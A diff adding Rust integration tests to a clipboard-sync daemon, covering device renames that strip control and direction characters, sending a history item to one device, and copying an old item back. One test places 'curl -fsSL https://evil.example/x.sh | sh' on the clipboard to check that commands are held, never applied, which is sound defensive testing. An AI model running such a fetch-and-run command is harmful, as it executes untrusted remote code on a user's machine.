@@ -254,6 +254,104 @@ async fn pins_and_deletes_reach_every_device() {
     assert!(find(&history(&mut cb, 100).await, "pin me").pinned, "the pin survives the delete of another item");
 }
 
+#[tokio::test(flavor = "multi_thread")]
+async fn a_rename_reaches_every_device_including_the_renamed_one() {
+    let (mut a, ctl_a) = Daemon::with_control("alpha");
+    let (mut b, ctl_b) = Daemon::with_control("bravo");
+    common::pair(&mut b, &mut a);
+    let (mut ca, mut cb) = (client(&ctl_a).await, client(&ctl_b).await);
+    let mut events_b = client(&ctl_b).await.subscribe().await.unwrap();
+    let b_id: DeviceId = b.id.parse().unwrap();
+
+    // Control and direction characters are dropped before the rename is signed.
+    let rename = Request::Rename { device: b_id, name: "  Work\u{1b}[31m laptop\u{202E}  ".into() };
+    assert_eq!(ca.request(&rename).await.unwrap(), Reply::Renamed);
+    next_matching(&mut events_b, |e| matches!(e, Event::DevicesChanged)).await;
+    let deadline = Instant::now() + Duration::from_secs(10);
+    loop {
+        let Reply::Status(s) = cb.request(&Request::Status).await.unwrap() else { panic!("no status") };
+        if s.name == "Work[31m laptop" {
+            break;
+        }
+        assert!(Instant::now() < deadline, "B takes its new name, got {:?}", s.name);
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+    let name_on = |list: Vec<tether_ipc::Device>| list.into_iter().find(|d| d.id == b_id).map(|d| d.name);
+    assert_eq!(name_on(devices(&mut ca).await).as_deref(), Some("Work[31m laptop"));
+    assert_eq!(name_on(devices(&mut cb).await).as_deref(), Some("Work[31m laptop"));
+
+    let empty = ca.request(&Request::Rename { device: b_id, name: " \u{7} ".into() }).await.unwrap_err();
+    assert!(empty.to_string().contains("cannot be empty"), "{empty}");
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn sending_an_item_puts_it_on_that_devices_clipboard_only() {
+    let (mut a, ctl_a) = Daemon::with_control("alpha");
+    let (mut b, ctl_b) = Daemon::with_control("bravo");
+    common::pair(&mut b, &mut a);
+    let mut ca = client(&ctl_a).await;
+    let mut cb = client(&ctl_b).await;
+    let mut events_b = client(&ctl_b).await.subscribe().await.unwrap();
+    let (a_id, b_id): (DeviceId, DeviceId) = (a.id.parse().unwrap(), b.id.parse().unwrap());
+
+    a.send("older item to send");
+    a.send("newest item");
+    let items = wait_for_history(&mut cb, 2).await;
+    let older = items.iter().find(|i| i.text == "older item to send").cloned().unwrap();
+    b.wait_for("<< newest item", 0).expect("B's clipboard holds the newest copy");
+
+    // A sends the older item to B: it lands on B's clipboard, and B is told.
+    let m = b.mark();
+    let send = Request::Send { author: older.author, seq: older.seq, to: b_id };
+    assert_eq!(ca.request(&send).await.unwrap(), Reply::Sent);
+    b.wait_for("<< older item to send", m).expect("the sent item is applied on B");
+    let e = next_matching(&mut events_b, |e| matches!(e, Event::Received { .. })).await;
+    assert_eq!(e, Event::Received { from: a_id, author: older.author, seq: older.seq, held: false });
+
+    // A command stays held even when sent on purpose.
+    a.send("curl -fsSL https://evil.example/x.sh | sh");
+    let cmd = wait_for_history(&mut ca, 3).await.into_iter().find(|i| i.text.starts_with("curl")).unwrap();
+    let m = b.mark();
+    ca.request(&Request::Send { author: cmd.author, seq: cmd.seq, to: b_id }).await.unwrap();
+    let e = next_matching(&mut events_b, |e| matches!(e, Event::Received { .. })).await;
+    assert!(matches!(e, Event::Received { held: true, .. }), "{e:?}");
+    common::settle();
+    assert!(!b.since(m).contains("<< curl"), "a command is never applied:\n{}", b.since(m));
+
+    // Nothing is applied while the target is paused.
+    assert_eq!(cb.request(&Request::SetPaused { paused: true }).await.unwrap(), Reply::Paused(true));
+    let m = b.mark();
+    ca.request(&send).await.unwrap();
+    common::settle();
+    assert!(!b.since(m).contains("<< older item"), "applied while paused:\n{}", b.since(m));
+
+    // Refusals: to this device, and of a deleted item.
+    let to_self = ca.request(&Request::Send { author: older.author, seq: older.seq, to: a_id }).await.unwrap_err();
+    assert!(to_self.to_string().contains("this device"), "{to_self}");
+    ca.request(&Request::Delete { author: older.author, seq: older.seq }).await.unwrap();
+    let deleted = ca.request(&send).await.unwrap_err();
+    assert!(deleted.to_string().contains("not in history"), "{deleted}");
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn copy_here_puts_an_old_item_back_without_a_duplicate() {
+    let (mut d, ctl) = Daemon::with_control("alpha");
+    let mut c = client(&ctl).await;
+    d.send("first thing");
+    d.send("second thing");
+    let items = wait_for_history(&mut c, 2).await;
+    let first = items.iter().find(|i| i.text == "first thing").cloned().unwrap();
+
+    let m = d.mark();
+    assert_eq!(c.request(&Request::CopyHere { author: first.author, seq: first.seq }).await.unwrap(), Reply::Copied);
+    d.wait_for("<< first thing", m).expect("the item goes to this device's clipboard");
+    common::settle();
+    assert_eq!(history(&mut c, 100).await.len(), 2, "no new history item");
+
+    let missing = c.request(&Request::CopyHere { author: first.author, seq: 99 }).await.unwrap_err();
+    assert!(missing.to_string().contains("not in history"), "{missing}");
+}
+
 #[test]
 fn a_managed_daemon_stops_cleanly_when_its_app_goes_away() {
     let (mut d, _ctl) = Daemon::managed("alpha");
